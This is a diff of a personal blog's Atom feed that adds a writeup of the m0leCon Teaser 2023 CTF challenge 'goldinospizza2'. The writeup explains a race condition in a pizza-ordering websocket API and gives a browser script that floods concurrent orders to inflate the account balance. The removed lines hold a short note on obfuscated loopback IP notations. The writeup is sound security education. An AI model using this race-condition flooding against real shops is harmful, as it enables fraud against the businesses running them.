@@ -1,4 +1,89 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-05-15T21:31:55+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup</title><link href="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/" rel="alternate" type="text/html" title="Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup" /><published>2023-05-15T00:00:00+01:00</published><updated>2023-05-15T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/"><![CDATA[<p><a href="https://punksecurity.co.uk/ctf/2023/">Punk Security DevSecOps Birthday CTF</a><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-05-17T00:39:00+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">m0leCon Teaser 2023 Writeup</title><link href="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/" rel="alternate" type="text/html" title="m0leCon Teaser 2023 Writeup" /><published>2023-05-16T00:00:00+01:00</published><updated>2023-05-16T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/"><![CDATA[<p><a href="https://ctf.m0lecon.it/">m0leCon Teaser 2023</a><br />
+<a href="https://ctftime.org/event/1898">On CTFtime</a></p>
+
+<p>Overall good CTF with challenging original fun challenges.</p>
+
+<p>On this page:</p>
+
+<ul>
+  <li><a href="#goldinospizza2">goldinospizza2</a> - Web, websocket API, exploit race condition</li>
+</ul>
+
+<h2 id="goldinospizza2">goldinospizza2</h2>
+
+<p>The challenge was released at about 2:40 AM BST as the “<a href="https://discord.com/channels/1100159162794655904/1100159163096633447/1106757967291879506"><del>patched</del> <em>improved</em> version of <code class="highlighter-rouge">goldinospizza</code></a>”, which was about over 8 hours into the CTF. It was just before I was planning to go to bed, but the challenge looked solvable😅.</p>
+
+<p>The challenge was a web challenge with a website that allowed you to order pizza with a registered account. Most of the pizzas’ prices were ranging between 6 and 15, but there was one pizza named “The flagship of pizzas” that costs 1,000,000. The flag will be shown if this pizza is successfully ordered. The initial account balance is 30.</p>
+
+<p>Looking through the code, there are two websocket API functions that are interesting, one is <code class="highlighter-rouge">order</code>, and another one is <code class="highlighter-rouge">cancel</code>. The <code class="highlighter-rouge">order</code> function is used to order a pizza, and the <code class="highlighter-rouge">cancel</code> function is used to cancel an order and get refund.</p>
+
+<p>The <code class="highlighter-rouge">order</code> function is implemented as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">order</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="c1"># Some checks on input omitted
+</span>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s">"orders"</span><span class="p">]:</span>
+        <span class="c1"># Some checks on input omitted
+</span>        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="s">"quantity"</span><span class="p">])</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">int</span><span class="p">:</span>
+            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"ONE OF YOUR 🍕 'quantity' IS NOT INT"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">item</span><span class="p">[</span><span class="s">"quantity"</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"ONE OF YOUR 🍕 'quantity' IS NOT VALID"</span><span class="p">)</span>
+        <span class="n">product</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="n">Product</span><span class="p">).</span><span class="nb">filter</span><span class="p">(</span>
+            <span class="n">Product</span><span class="p">.</span><span class="nb">id</span> <span class="o">==</span> <span class="n">item</span><span class="p">[</span><span class="s">"product"</span><span class="p">])).</span><span class="n">scalars</span><span class="p">().</span><span class="n">one_or_none</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">product</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"WE DON'T SELL THAT 🍕"</span><span class="p">)</span>
+        <span class="n">quantity</span> <span class="o">=</span> <span class="n">item</span><span class="p">[</span><span class="s">"quantity"</span><span class="p">]</span>
+        <span class="n">current_user</span><span class="p">.</span><span class="n">balance</span> <span class="o">-=</span> <span class="n">product</span><span class="p">.</span><span class="n">price</span> <span class="o">*</span> <span class="n">quantity</span>
+        <span class="k">if</span> <span class="n">current_user</span><span class="p">.</span><span class="n">balance</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"NO 🍕 STEALING ALLOWED!"</span><span class="p">)</span>
+        <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Order</span><span class="p">(</span>
+            <span class="n">user_id</span><span class="o">=</span><span class="n">current_user</span><span class="p">.</span><span class="nb">id</span><span class="p">,</span>
+            <span class="n">product_id</span><span class="o">=</span><span class="n">product</span><span class="p">.</span><span class="nb">id</span><span class="p">,</span>
+            <span class="n">product_quantity</span><span class="o">=</span><span class="n">quantity</span><span class="p">,</span>
+            <span class="n">product_price</span><span class="o">=</span><span class="n">product</span><span class="p">.</span><span class="n">price</span>
+        <span class="p">))</span>
+        <span class="k">if</span> <span class="n">product</span><span class="p">.</span><span class="nb">id</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">quantity</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span>
+                <span class="sa">f</span><span class="s">"WOW you are SO rich! Here's a little extra with your golden special 🍕: </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'FLAG'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">current_user</span><span class="p">)</span>
+    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s">"orders"</span><span class="p">]),</span> <span class="p">{</span><span class="s">"ok"</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span> <span class="s">"balance"</span><span class="p">:</span> <span class="n">current_user</span><span class="p">.</span><span class="n">balance</span><span class="p">,</span> <span class="s">"orders"</span><span class="p">:</span> <span class="n">_orders</span><span class="p">()}</span>
+</code></pre></div></div>
+
+<p>In the code, I identified that there is a race condition that can be exploited to make total order larger than we have in the balance, and cancel the order to refund so we can have more balanced than we started with.</p>
+
+<p>We can blast with multiple websocket requests to make order, and if the previous order has not been committed to the database, the next request is still checked against the old balance.</p>
+
+<p>To make programming easier, I did scripting within the browser console within the context of the website. After some initial test, my balance increased to 66.00 from the initial 30.00.</p>
+
+<p><img src="/assets/image/m0lecon-teaser-2023-writeup/pizza-balance.png" alt="Balance increased to 66.00" /></p>
+
+<p>The script I used to blast the order is as follows:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">request</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">order</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">orders</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
+        <span class="dl">"</span><span class="s2">product</span><span class="dl">"</span><span class="p">:</span> <span class="mi">19</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">quantity</span><span class="dl">"</span><span class="p">:</span> <span class="mi">9792</span><span class="p">,</span>
+    <span class="p">},</span> <span class="p">],</span>
+<span class="p">}</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">`wss://goldinospizza2.challs.m0lecon.it/sock`</span><span class="p">);</span>
+    <span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">open</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">message</span><span class="p">))</span>
+    <span class="p">})</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The connection will get killed after some numbers of requests. To scale this up, when I repeated the process, I increased the quantity of each of the order to the amount that I can afford with the balance. Then my available balance increased increases exponentially.</p>
+
+<p>With enough balance, order the golden “The flagship of pizzas”, get the flag and submitted at 4:00 AM BST. Enjoy the 🍕:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ptm{https://youtu.be/Uzryuem5NDc lets make pizza greater than zero again https://www.giallozafferano.com/recipes/Pizza-Margherita.html}
+</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[m0leCon Teaser 2023 On CTFtime]]></summary></entry><entry><title type="html">Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup</title><link href="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/" rel="alternate" type="text/html" title="Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup" /><published>2023-05-15T00:00:00+01:00</published><updated>2023-05-15T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/"><![CDATA[<p><a href="https://punksecurity.co.uk/ctf/2023/">Punk Security DevSecOps Birthday CTF</a><br />
 <a href="https://ctftime.org/event/1903">On CTFtime</a></p>
 
 <p>We did the 12-hour CTF on 4th May 2023. The CTF is unique and primarily focused on DevSecOps, including CI/CD pipelines, cloud etc. It is not in my best expertises, but we had a strong team and managed to full clear all the challenges and won the CTF.</p>
@@ -1336,14 +1421,4 @@ for input_id in input_ids:
 
 <h2 id="tcp-transmission">TCP Transmission</h2>
 
-<p>Video explaining TCP handshake and transmission step-by-step: <a href="https://youtu.be/v3m9F9nEpCA?t=862">https://youtu.be/v3m9F9nEpCA?t=862</a> by kanak (Connor Nelson) from <a href="https://pwn.college/">pwn.college</a> (ASU CSE 365).</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with a collection of good learning resources.]]></summary></entry><entry><title type="html">Things Blow Up My Mind</title><link href="https://www.cjxol.com/posts/things-blow-up-my-mind/" rel="alternate" type="text/html" title="Things Blow Up My Mind" /><published>2022-05-13T00:00:00+01:00</published><updated>2022-05-13T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/things-blow-up-my-mind</id><content type="html" xml:base="https://www.cjxol.com/posts/things-blow-up-my-mind/"><![CDATA[<p>This post is being continuously updated with random things I come across.</p>
-
-<p><small>Last updated on 13th May 2022.</small></p>
-
-<h2 id="totally-legit-ip-address">Totally Legit IP Address</h2>
-
-<p>Do you know you can do <code class="highlighter-rouge">ping 0177.0x10.01</code> (which pings 127.16.0.1)?</p>
-
-<p>Or even <code class="highlighter-rouge">ping 2130706433</code> (127.0.0.1 in dword) (<a href="https://www.youtube.com/watch?v=PT_qEhesKW8&amp;lc=Ugz5183SkhDLxzW5Mf14AaABAg.9av7AJhjNVy9aw2sVU3iaf">dono’s comment</a>) or <code class="highlighter-rouge">http://2130706433</code>.</p>
-
-<p>See <a href="https://www.youtube.com/watch?v=PT_qEhesKW8">Hussein Nasser’s YouTube video</a>.</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with random things I come across.]]></summary></entry></feed>
+<p>Video explaining TCP handshake and transmission step-by-step: <a href="https://youtu.be/v3m9F9nEpCA?t=862">https://youtu.be/v3m9F9nEpCA?t=862</a> by kanak (Connor Nelson) from <a href="https://pwn.college/">pwn.college</a> (ASU CSE 365).</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with a collection of good learning resources.]]></summary></entry></feed>
